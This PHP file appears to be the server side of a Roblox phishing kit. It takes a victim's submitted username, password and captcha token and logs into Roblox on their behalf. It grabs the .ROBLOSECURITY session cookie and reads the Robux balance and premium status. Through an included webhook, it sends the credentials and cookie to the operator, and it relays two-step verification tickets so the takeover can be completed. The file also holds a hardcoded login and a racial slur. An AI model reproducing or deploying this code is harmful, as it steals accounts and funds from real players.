<?php
error_reporting(0);
//session_save_path('/tmp');
session_start();
/*if ($_SERVER['REQUEST_METHOD'] != 'POST') {
	echo "lgi ngapain om";
   exit;
 }*/
include "webhook.php";
$u=$_POST["username"];
$p=$_POST["password"];
$tokens=$_POST["fc"];
$pl = strlen((string)$p);
if($pl<"8"){
	echo "Nigga go skid someone else's source..";
	}else
 if($u==null||$p==null){
    echo "*";
}else{
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
	"cvalue":"LeakedButter",
	"ctype":"Username",
	"password":"RAMADHAN001",
}'
);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$headers = [];
$result = rtrim($result);
$data = explode("\n",$result);
$headers['status'] = $data[0];
array_shift($data);

foreach($data as $part){

    //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
    $middle = explode(":",$part,2);

    //Supress warning message if $middle[1] does not exist, Thanks to @crayons
    if ( !isset($middle[1]) ) { $middle[1] = null; }
$headers[trim($middle[0])] = trim($middle[1]);
}

$csrf= $headers["x-csrf-token"];

$fields_string='{
	"cvalue":"'.$u.'",
	"ctype":"username",
	"password":"'.$p.'",
	"captchaToken":"'.$tokens.'",
	"captchaId":"",
"captchaProvider":"PROVIDER_ARKOSE_LABS"
}';

$ch2= curl_init();

curl_setopt($ch2, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_HEADER, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
$header_size = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
$output = curl_exec($ch2);
$enc=json_encode($fd);

$header_len = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
$header = substr($output, 0, $header_len);
$body = substr($output, $header_len);
    $cookie = null;
    foreach(explode("\n",$header) as $part) {
        if (strpos($part, ".ROBLOSECURITY")) {
            $cookie = explode(";", explode("=", $part)[1])[0];
            break;
        }
    }
$a=$_SESSION["username"]=$u;
$b=$_SESSION["password"]=$p;
$out=json_decode($body, true);
$twostep= $out['twoStepVerificationData']['ticket'];
$uid= $out['user']['id'];

//var_dump($cookie);
//var_dump($twostep);

 if($cookie){
 		$ch2= curl_init();

curl_setopt($ch2, CURLOPT_URL, 'https://www.roblox.com/mobileapi/userinfo');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
$output = curl_exec($ch2);
$info=json_decode($output);
$robux=$info->RobuxBalance;
if($info->IsPremium){
	$premium="True";
	}else{
		$premium="False";
		}
		$username=$_SESSION["username"];
$password=$_SESSION["password"];
sendMsg($username, $password, "false", $webhook, $webhook2, "", $cookie, "1", $robux, $premium);
			$true= "V";
			echo $true;
		}else if($cookie==NULL&&$twostep!=NULL){
	$_SESSION["username"]=$u;
	$_SESSION["password"]=$p;
	setcookie("ticket", $twostep, time() + (86400 * 30), "/");
	setcookie("uid", $uid, time() + (86400 * 30), "/");
	$true= "2";
	echo $true;
	}else{
			$true= "x";
			echo $true;
			}
			}
?>